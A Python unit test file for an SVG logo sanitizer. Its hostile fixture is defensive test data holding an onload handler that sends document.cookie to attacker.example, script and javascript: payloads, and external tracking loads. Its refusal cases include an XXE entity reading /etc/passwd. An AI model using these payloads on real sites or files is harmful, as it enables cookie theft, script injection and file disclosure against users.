"""Item 5: an SVG logo is reduced to static drawing before it is saved or copied into a brand."""
from __future__ import annotations

import unittest
from xml.etree import ElementTree as ET

import _helpers as H  # noqa: F401

import _filesafe as F

NS = "{http://www.w3.org/2000/svg}"
HOSTILE = """<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet href="https://attacker.example/x.css"?>
<!-- comment -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 20" width="100" height="20"
     onload="fetch('https://attacker.example/?c='+document.cookie)" data-x="1">
  <title>Logo</title>
  <script>alert(1)</script>
  <script xlink:href="https://attacker.example/x.js"/>
  <style>.a{fill:#123456} .b{fill:url(#g)}</style>
  <style>@import url(https://attacker.example/x.css); .c{background:url(https://attacker.example/t.png)}</style>
  <defs>
    <linearGradient id="g"><stop offset="0" stop-color="#f00"/><stop offset="1" stop-color="#00f"/></linearGradient>
    <linearGradient id="h" xlink:href="#g"/>
    <linearGradient id="i" xlink:href="https://attacker.example/g.svg#g"/>
    <filter id="f"><feImage href="https://attacker.example/f.png"/></filter>
  </defs>
  <foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(1)"/></body></foreignObject>
  <image href="https://attacker.example/track.png" width="1" height="1"/>
  <image xlink:href="data:image/svg+xml;base64,PHN2Zy8+" width="1" height="1"/>
  <a xlink:href="javascript:alert(1)"><rect width="5" height="5"/></a>
  <use xlink:href="https://attacker.example/sprite.svg#x"/>
  <use href="#p"/>
  <path id="p" class="a" d="M0 0h100v20H0z" fill="url(#g)" onclick="alert(1)" style="fill:url(https://attacker.example/p.png)" filter="url(#f)"/>
  <rect width="10" height="10" fill="url( 'https://attacker.example/x' )" stroke="#000"/>
  <circle r="3" style="fill: red; stroke: url(#g)"/>
  <rect width="2" height="2" style="fill: image-set('https://attacker.example/i.png' 1x)"/>
  <rect width="2" height="2" style="fill: -webkit-image-set(&quot;https://attacker.example/w.png&quot; 1x)"/>
  <style>.d{background: cross-fade(src("https://attacker.example/s.png"), red 50%)}</style>
  <animate attributeName="href" values="javascript:alert(1)"/>
  <set attributeName="onload" to="alert(1)"/>
  <text x="0" y="10" font-family="Inter">Acme<tspan dx="2">Co</tspan></text>
</svg>
"""


class SanitizeSvgTest(unittest.TestCase):
    def test_everything_active_or_external_is_removed(self):
        clean, removed = F.sanitize_svg(HOSTILE.encode("utf-8"))
        text = clean.decode("utf-8")
        for bad in ("script", "onload", "onclick", "attacker", "javascript", "foreignObject", "iframe", "<image", "data:", "@import", "animate", "<set",
                    "filter", "xml-stylesheet", "comment", "data-x", "<a ", "xlink"):
            self.assertNotIn(bad, text, bad)
        root = ET.fromstring(text)
        self.assertEqual(root.tag, NS + "svg")
        self.assertEqual(root.get("viewBox"), "0 0 100 20")
        path = root.find(NS + "path")
        self.assertEqual((path.get("d"), path.get("fill"), path.get("class"), path.get("style")), ("M0 0h100v20H0z", "url(#g)", "a", None))
        self.assertEqual([u.get("href") for u in root.findall(NS + "use")], ["#p"])
        self.assertEqual([g.get("href") for g in root.iter(NS + "linearGradient")], [None, "#g", None])
        self.assertEqual([s.text for s in root.findall(NS + "style")], [".a{fill:#123456} .b{fill:url(#g)}"])
        self.assertIsNone(root.find(NS + "rect").get("fill"))
        self.assertEqual(root.find(NS + "circle").get("style"), "fill: red; stroke: url(#g)")
        self.assertEqual("".join(root.find(NS + "text").itertext()), "AcmeCo")
        self.assertEqual(F.sniff(clean), "svg")
        for expected in ("<script>", "<foreignObject>", "<image>", "<a>", "<filter>", "svg onload", "path onclick", "use href"):
            self.assertIn(expected, " | ".join(removed), expected)

    def test_a_clean_logo_keeps_its_drawing(self):
        clean, removed = F.sanitize_svg(H.SVG)
        self.assertEqual(removed, [])
        self.assertIn('d="M0 0h40v10H0z"', clean.decode())
        illustrator = b'<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n' + H.SVG
        self.assertEqual(F.sanitize_svg(illustrator)[0], clean)
        self.assertEqual(F.sanitize_svg(b'<svg viewBox="0 0 4 4"><rect width="4" height="4"/></svg>')[1], [])

    def test_what_cannot_be_made_safe_is_refused(self):
        cases = {
            "entities": b'<!DOCTYPE svg [<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>',
            "external entity": b'<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>',
            "utf-16": H.SVG.decode().encode("utf-16"),
            "not svg": b"<html><body/></html>",
            "not xml": b"<svg><path d='M0 0'></svg",
            "html entity": b'<svg xmlns="http://www.w3.org/2000/svg"><text>a&nbsp;b</text></svg>',
            "nothing left": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            "too large": b'<svg xmlns="http://www.w3.org/2000/svg">' + b"<g/>" * 600000 + b"</svg>",
            "too deep": b'<svg xmlns="http://www.w3.org/2000/svg">' + b"<g>" * 100 + b"<path d='M0 0'/>" + b"</g>" * 100 + b"</svg>",
        }
        for label, raw in cases.items():
            with self.subTest(case=label):
                with self.assertRaises(F.Refused):
                    F.sanitize_svg(raw)


if __name__ == "__main__":
    unittest.main()
